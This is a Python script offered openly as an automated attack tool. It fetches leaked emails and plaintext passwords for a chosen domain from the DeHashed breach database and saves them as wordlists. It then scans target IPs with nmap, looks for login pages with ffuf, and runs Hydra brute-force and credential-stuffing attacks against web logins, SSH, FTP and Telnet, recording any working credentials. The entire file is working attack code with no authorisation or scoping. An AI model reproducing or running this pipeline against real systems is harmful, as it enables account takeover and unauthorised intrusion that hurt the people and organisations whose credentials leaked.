import requests
import subprocess
import os
import argparse
from time import sleep
import logging
import json

parser = argparse.ArgumentParser(description="Automated tool for leaked credentials search, open port scan, and brute-force attempts.")
parser.add_argument("-d", "--domain", help="Domain to search in DeHashed")
parser.add_argument("-e", "--email", help="DeHashed account email")
parser.add_argument("-k", "--apikey", help="DeHashed API key")
parser.add_argument("-ipfile", "--ipfile", help="File with list of IPs to scan")
parser.add_argument("-v", "--verbose", action="store_true", help="Print verbose output")
args = parser.parse_args()

username_list_file = "usernames.txt"
password_list_file = "passwords.txt"
unsuccessful_log_file = "login_attempts.txt"
successful_log_file = "successful_logins.txt"

logging.basicConfig(level=logging.INFO)

def query_dehashed(domain, email, apikey, verbose=False):
    entries = []
    page = 1
    entries_per_page = 10000

    while True:
        url = f"https://api.dehashed.com/search?query=domain:{domain}&size={entries_per_page}&page={page}"
        headers = {"Accept": "application/json"}
        response = requests.get(url, headers=headers, auth=(email, apikey))

        if verbose:
            print(f"Response status code: {response.status_code}")
            print(f"Response text: {response.text}")

        if response.status_code != 200:
            print(f"Error querying DeHashed: {response.status_code} {response.text}")
            break

        try:
            data = response.json()
        except json.JSONDecodeError:
            print("Error: Unable to parse JSON response from DeHashed API")
            break

        if "entries" not in data or data["entries"] is None:
            print(f"Unexpected response format or no entries found: {data}")
            break

        if isinstance(data["entries"], list):
            entries.extend(data["entries"])
            print(f"Fetched {len(data['entries'])} entries from page {page}.")

        if page * entries_per_page >= data["total"]:
            break
        else:
            page += 1
            sleep(0.2)

    print(f"Total entries fetched: {len(entries)}")
    return entries

def save_credentials(entries):
    usernames = set()
    passwords = set()

    for entry in entries:
        if "email" in entry:
            username = entry["email"].split("@")[0]
            usernames.add(username)
        if "password" in entry:
            passwords.add(entry["password"])

    with open(username_list_file, "w") as f:
        f.write("\n".join(usernames))
    
    with open(password_list_file, "w") as f:
        f.write("\n".join(passwords))

    print(f"Saved {len(usernames)} usernames and {len(passwords)} passwords to text files.")

def log_unsuccessful_attempt(ip, port, service):
    with open(unsuccessful_log_file, "a") as file:
        file.write(f"Port {port} on {ip} - {service}: Logins unsuccessful\n")

def log_successful_login(ip, port, service, username, password):
    with open(successful_log_file, "a") as file:
        file.write(f"Port {port} on {ip} - {service}: Successful login with {username}/{password}\n")

def scan_open_ports(ip):
    print(f"Scanning {ip} for open ports...")
    result = subprocess.run(
        ["nmap", "-p22,21,23,80,443,8080,8443,10443", "--open", "-Pn", ip], capture_output=True, text=True
    )
    return result.stdout

def parse_nmap_result(scan_output):
    services = {"http": [], "ssh": False, "ftp": False, "telnet": False}
    for line in scan_output.splitlines():
        if "22/tcp open" in line:
            services["ssh"] = True
        elif "21/tcp open" in line:
            services["ftp"] = True
        elif "23/tcp open" in line:
            services["telnet"] = True
        elif any(port in line for port in ["80/tcp open", "443/tcp open", "8080/tcp open", "8443/tcp open", "10443/tcp open"]):
            services["http"].append(line.split("/")[0])

    return services

def scan_for_login_pages(ip, port):
    protocol = "https" if port in ["443", "8443", "10443"] else "http"
    ffuf_command = [
        "ffuf", "-u", f"{protocol}://{ip}:{port}/FUZZ", "-w", "common.txt",
        "-mr", "login", "-o", f"ffuf_{ip}_{port}_results.json", "-t", "50", "-k"
    ]
    print(f"Scanning {ip}:{port} for login pages with FFuf...")
    subprocess.run(ffuf_command)

    if os.path.exists(f"ffuf_{ip}_{port}_results.json"):
        with open(f"ffuf_{ip}_{port}_results.json", "r") as ffuf_results:
            return any("login" in line for line in ffuf_results.readlines())
    return False

def run_hydra(ip, service, port, username_list, password_list):
    if service == "http":
        protocol = "https" if port in ["443", "8443", "10443"] else "http"
        hydra_command = [
            "hydra", "-L", username_list, "-P", password_list,
            f"{protocol}-post-form", f"{ip}:{port}:/login.php:username=^USER^&password=^PASS^:Invalid credentials",
            "-I", "-t", "4", "-vV"
        ]
    elif service == "ssh":
        hydra_command = ["hydra", "-L", username_list, "-P", password_list, "ssh", ip]
    elif service == "ftp":
        hydra_command = ["hydra", "-L", username_list, "-P", password_list, "ftp", ip]
    elif service == "telnet":
        hydra_command = ["hydra", "-L", username_list, "-P", password_list, "telnet", ip]
    else:
        return

    print(f"Running Hydra against {service} on {ip}:{port}...")
    result = subprocess.run(hydra_command, capture_output=True, text=True)

    if "login:" in result.stdout and "password:" in result.stdout:
        try:
            username = result.stdout.split("login: ")[1].split(" password: ")[0]
            password = result.stdout.split("password: ")[1].split("\n")[0]
            log_successful_login(ip, port, service, username, password)
        except IndexError:
            print(f"Error parsing Hydra output: {result.stdout}")
            log_unsuccessful_attempt(ip, port, service)
    else:
        log_unsuccessful_attempt(ip, port, service)

def main():
    entries = query_dehashed(args.domain, args.email, args.apikey)
    if not entries:
        print("No entries found for the domain.")
        return

    save_credentials(entries)

    with open(args.ipfile, "r") as f:
        ip_addresses = f.read().splitlines()

    for ip in ip_addresses:
        nmap_result = scan_open_ports(ip)
        services = parse_nmap_result(nmap_result)

        for port in services["http"]:
            if scan_for_login_pages(ip, port):
                run_hydra(ip, "http", port, username_list_file, password_list_file)

        for service, is_open in services.items():
            if service != "http" and is_open:
                run_hydra(ip, service, "", username_list_file, password_list_file)

if __name__ == "__main__":
    main()
    os.system('echo "process Finished"')


